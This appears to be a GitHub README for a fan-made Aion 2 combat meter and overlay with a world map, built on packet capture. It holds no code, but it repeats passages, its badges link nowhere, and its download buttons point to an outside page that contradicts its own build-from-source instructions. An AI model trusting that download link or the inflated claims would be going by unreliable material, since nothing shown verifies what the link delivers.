<div align="center">

# Ezzar Daeva Companion — One Dashboard, Overlay & Living World Map — Video Tool

![preview](https://raw.githubusercontent.com/rag1874/ezzar-daeva-companion/main/shot_c099c08.svg)

[![downloads](https://img.shields.io/badge/downloads-312K-2f81f7?style=flat&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/platform-Windows_10_%7C_11-2f81f7?style=flat&labelColor=0d1117)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=flat&labelColor=0d1117)]()

[![Download](https://raw.githubusercontent.com/rag1874/ezzar-daeva-companion/main/go_9b481b0.svg)](https://rag1874.github.io/ezzar-daeva-companion/)

</div>

---

A single dashboard holds every module, a single transparent overlay floats above the game, and the world map follows you from region to region with your screenshots lined up against game coordinates. Built as a personal fork of the A2Tools DPS Meter for Aion 2, this companion reads a copy of the game's network traffic and never touches its files or memory, keeping your fights, timers and tracked markers in one visual workflow. Bars, alerts, timers and popups all land in the same overlay, dragged into place on a grid and locked so clicks pass straight through to the game. Everything you track stays close at hand, from cooldown bars and boss timers to the monsters and party members moving across your map.

## One dashboard, one overlay

Everything lives in one **dashboard** window: a sidebar with every module down the left, and across the top a single set of controls that governs whatever is currently on screen. The app opens it on launch, and the meter's header carries a button back to it whenever you've tucked it away.

- **One overlay.** Every bar, alert, timer and popup is drawn inside a single transparent window that floats over the game, on the game's own screen. On KDE it follows the game wherever it roams (a KWin script does the placing, and keeps both the overlay and the meter off the taskbar); everywhere else the app handles placement. Prefer to choose yourself? **Overlay → Screen** lets you pin it.
- **Edit layout** dims the screen and lays out a sample of every alert with its name attached, so you can drag anything into position. Things snap to a grid and to the screen's midline. **Done** on the screen ends editing, and **Reset layout** returns everything to its starting spot.
- **Lock** (on from the start, and **Ctrl+Alt+L** when global hotkeys are enabled) lets every click pass straight through to the game; unlocked, only the widgets themselves accept clicks, never the empty space around them. **Hide all** tucks away the meter and the overlay together.
- **Timers:** whatever you're tracking (world bosses, Abyss bosses, events) gathers into one list on the overlay, folded down to the next timer until you click it open, even while locked. Event Timers' **Settings** splits into the list's own preferences (show it, what it shows folded, such as everything upcoming or starting within 30 minutes, and how many it lists open) and the popups' preferences. Nothing else appears: no icon per timer. You choose what to track on Event Timers' **Track** tab; each tracked entry earns a popup a few minutes before it begins (its bell silences that).
- **Setup guide:** on first start the dashboard walks you through the app one step at a time (your screen and modules, what to track, cooldown bars, alerts, the map, your character, your routine, placing things). It waits on Home whenever you want to run it again.
- Closing the dashboard only hides it: the modules keep running, and their overlays and alerts keep firing with them. **Notices** surfaces every module's alert as a popup over the game, such as a Spacetime Rift about to open or a world boss coming due.

Each module can be switched off on the dashboard's **Overlay** page.

## What it does

One meter, one window, one place for everything the game throws at you. This fork of A2Tools DPS Meter keeps the whole show on a single dashboard: a sidebar of modules, a row of controls that govern every bar and popup at once, and a transparent overlay that sits on the game's screen and follows it there. Lock it and clicks pass straight through to Aion; unlock it and only the widgets themselves catch the mouse. **Edit layout** dims everything, stamps a labeled sample of each alert on screen, and lets you drag pieces into place with snapping and a center guide — **Done** ends the session, **Reset layout** rewinds it.

- **DPS meter:** party ranking, share, crit, per-skill breakdowns, targets (all, bosses, current)
- **Combat Assist:** cooldown and buff bars anywhere, ready-glow, square or round or plain bars, rows or stacks, hidden out of combat
- **Fight history:** saved boss fights with damage, healing, taken, buffs, and DPS over time
- **Shareable reports:** combat logs posted as labeled fork uploads for rankings and leaderboards
- **PvP Overlay:** opponents, damage dealt and taken, HP, class, defeats; saved sessions with kills, deaths, biggest burst, skills, and DPS over time
- **Fight Records:** Training mode timed runs (30 seconds to 5 minutes, or unlimited) on a dummy tracking only your damage, with names, notes, groups, and side-by-side comparison — plus personal bests
- **Combat Alerts:** loss-of-control notice (stun, sleep, fear, knockdown…) counting down, and party debuff alerts when the same debuff lands on several members
- **Dungeon Runs:** clear time, deaths, each member's numbers, every boss fight
- **Event Timers:** Event alerts (Shugo Festival, Rift, resets, sieges, bosses), sound, and desktop notifications while the game is closed
- **Ping** overlay plugin
- **Pet Soul Tracker:** souls per pet, phases, drop sources
- **World Map:** your own screenshots aligned to game coordinates, Kibelisks, pet soul monster areas, field bosses with timers, monsters you've seen, you and your party, pins, imported markers
- **Progression Guide:** your character pulled from the official profile and compared against the strongest of your class, plus a gear score roadmap
- **Daily Planner:** Daily Duties, Shugo Festival's three keys, Nightmare, the week's dungeon entries, Odyle Energy, and your own tasks, with reminders before a reset

The overlay folds your tracked timers — world bosses, Abyss bosses, events — into one list that stays collapsed to the next one until you click it open, even while locked. Every tracked entry gets a popup a few minutes ahead of its start (a bell silences that). The map follows you: drag your stitched picture under the markers until the Kibelisks land on the teleport statues, or click three known spots for an exact fit. The dashboard's first-launch setup guide walks you through it all a step at a time, from your screen and modules to your character and routine, and Home lets you rerun it. Closing the dashboard only hides it: modules, overlays, and alerts keep running, and **Notices** surfaces any module's alert right over the game. Every module can be switched off on the dashboard's **Overlay** page.

## The World Map

Your own screenshots become the ground truth of the world. Open the in-game map zoomed out until the whole region fits, grab it, and that picture is the map. Paste it in, drop it onto the canvas, or pick the file: the markers scatter across it in a single pass. From there it's a matter of lining things up — drag the cluster until the Kibelisks land on the teleport statues, or click three known places in the game for an exact fit. Size, turn, or mirror the picture until it sits right, and it stays on your machine, never leaves it.

Two regions arrive ready to go, their pictures already stitched and aligned, so the very first map has something to show. Everything else waits for your screenshot — one image per region and the whole world opens up.

The markers themselves come from several directions at once. Community data that ships with the plugins lays down the Kibelisks, the pet soul monster areas, and the field bosses, timers included. The game itself feeds the map as you play: where you are, where your party is, where monsters cast from. Your own pins go wherever you plant them, and marker files import straight from JSON or CSV in game coordinates. Each layer can be shown or hidden; together they turn a static picture into a living chart of the world.

Pin a spot, watch a boss timer tick down over its territory, see your party spread across the zone — the map follows you on one overlay, in one dashboard, on whichever screen the game is on. Close the dashboard and it keeps running; open it and the world is still there, exactly where you left it.

## How cooldowns are known

Nothing in the stream announces "this skill is now recharging." So Combat Assist watches you fight and works it out: the timer is the shortest gap it has ever seen between two casts of the same skill. If a single much shorter gap appears, it assumes another skill shaved time off the cooldown, and tags that bar with a ▼ so you know why the number jumped.

Trust arrives in stages, and the bar wears its confidence. A first estimate reads with a ~, a guess waiting for backup. Once the same gap shows up a second time, the ~ drops away and the bar counts down for real. Skills whose damage lands after the cast, the delayed explosions, still count as one cast rather than two, so the timing stays honest.

When a number is simply wrong, **Re-learn** wipes it and starts the count fresh on the next cast. Prefer to settle it yourself? Type the seconds in by hand and the bar obeys. And for a cleaner screen, any bar can be set to show its icons only while they are actually ticking down, appearing when the cooldown starts and slipping away when it ends.

## Install

Getting the companion onto your machine is a build-it-yourself affair, and that's by design: it keeps the fork self-contained and you in control of the binary that ends up on your disk.

On the image-based Fedora family (Bazzite, Silverblue, Kinoite) the flow is layer-and-reboot. Build the package once from a Fedora toolbox or distrobox that carries the build dependencies plus the rpm tooling, then layer the resulting package into your base image and restart. The package grants its own packet-capture permission on install, so there's no separate capability step. After the reboot, launch the companion from the app menu first, then bring up AION 2. On KDE Plasma the meter slips in window rules to stay above the game, mirroring how upstream handles it.

On a traditional Fedora install the same build script produces the same package, which you install directly with your package manager's local-install path. Reboot isn't required.

On Windows 10 and 11 the path runs through the installer bundle: install the packet-capture driver with the legacy API-compatible mode enabled, then build the installer with the Rust and Node toolchains present. The MSI lands in the Tauri bundle output folder. Run it elevated, since capturing traffic needs administrator rights.

Whichever route you take, the goal is the same: a single companion that sits above your game, one overlay, one dashboard, and a map that follows you. From there, the on-first-start setup guide walks you through the rest.

## Credits and license

GPL-3.0, because it grew out of something open: the A2Tools DPS Meter's meter, protocol work and plugin host are the foundation this companion stands on, and its original README rides along in the repository. The bundled plugins (Event Timers, Pet Soul Tracker, Ping) come from the same open-source family, with Event Timers here gaining desktop notifications while the game is closed. The World Map's markers are built from that community data too, lined up over pictures you supply and keep on your own machine.

This fork is a personal companion, not an official product: not affiliated with NCSOFT, Questlog or A2Tools. Treat third-party meters as potentially against the game's terms of service, and play at your own risk.

[![Download](https://raw.githubusercontent.com/rag1874/ezzar-daeva-companion/main/go_9b481b0.svg)](https://rag1874.github.io/ezzar-daeva-companion/)